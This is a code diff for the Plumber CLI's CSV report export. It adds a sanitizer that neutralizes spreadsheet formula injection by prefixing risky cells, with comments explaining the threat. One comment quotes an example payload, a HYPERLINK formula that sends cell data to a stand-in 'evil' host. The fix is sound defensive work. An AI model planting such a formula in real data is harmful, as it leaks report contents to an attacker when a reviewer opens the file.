@@ -7,6 +7,7 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"unicode"
 
 	"github.com/getplumber/plumber/configuration"
 	"github.com/getplumber/plumber/control"
@@ -52,7 +53,7 @@ func buildCSV(entries []control.ControlEntry, result *control.AnalysisResult) []
 		status := control.StatusFor(e, result, len(findings))
 
 		if status != control.StatusFailed {
-			nonFailing = append(nonFailing, []string{
+			nonFailing = append(nonFailing, csvSafeRow([]string{
 				"",                                 // code
 				"",                                 // fingerprint (no finding)
 				e.ControlName,                      // controlName
@@ -64,7 +65,7 @@ func buildCSV(entries []control.ControlEntry, result *control.AnalysisResult) []
 				"",                                 // line
 				"",                                 // url
 				"",                                 // docUrl
-			})
+			}))
 			continue
 		}
 
@@ -86,7 +87,7 @@ func buildCSV(entries []control.ControlEntry, result *control.AnalysisResult) []
 				line = strconv.Itoa(f.Line)
 			}
 
-			failing = append(failing, []string{
+			failing = append(failing, csvSafeRow([]string{
 				f.Code,
 				f.Fingerprint,
 				e.ControlName,
@@ -98,15 +99,58 @@ func buildCSV(entries []control.ControlEntry, result *control.AnalysisResult) []
 				line,
 				f.URL,
 				"https://getplumber.io/docs/cli/issues/" + f.Code,
-			})
+			}))
 		}
 	}
 
-	records := make([][]string, 0, 1+len(nonFailing)+len(failing))
-	records = append(records, header)
+	// Built by appending rather than pre-sizing: summing two lengths is a
+	// size computation CodeQL flags as potentially overflowing, and the
+	// capacity hint buys nothing at this scale.
+	records := [][]string{header}
 	records = append(records, nonFailing...)
 	records = append(records, failing...)
 	return records
+}
+
+// csvSafeCell neutralizes spreadsheet formula injection (CWE-1236). Go's
+// encoding/csv quotes only for CSV *parsing* (commas, quotes, newlines); it
+// does nothing about a cell a spreadsheet evaluates as a formula. Findings
+// carry values the scanned project controls, not Plumber: job names are
+// author-defined and rule messages embed them verbatim, so a job named
+// `=HYPERLINK("http://evil/"&A2,"x")` would execute when a reviewer opens the
+// report, which is the documented use for this format. Prefixing with a single
+// quote is the standard mitigation and leaves every value that does not start
+// with a trigger character untouched.
+func csvSafeCell(s string) string {
+	for _, r := range s {
+		switch r {
+		// The documented formula triggers, plus their full-width variants,
+		// which some locales (notably Japanese Excel) evaluate the same way.
+		// Matching on runes rather than bytes is what catches the full-width
+		// forms: they are multi-byte in UTF-8, so a byte comparison misses them.
+		case '=', '+', '-', '@', '\t', '\r',
+			'＝', '＋', '－', '＠':
+			return "'" + s
+		}
+		// Leading whitespace is not itself dangerous, but some import paths trim
+		// it before evaluating, so " =1+1" must not slip through. Keep scanning
+		// until the first meaningful rune.
+		if unicode.IsSpace(r) {
+			continue
+		}
+		return s
+	}
+	return s
+}
+
+// csvSafeRow applies csvSafeCell to every cell. Applied to whole rows rather
+// than to the fields that happen to be dynamic today, so a column added later
+// is covered by default.
+func csvSafeRow(row []string) []string {
+	for i := range row {
+		row[i] = csvSafeCell(row[i])
+	}
+	return row
 }
 
 // csvStatusReason returns the human explanation for a non-failing control's row:
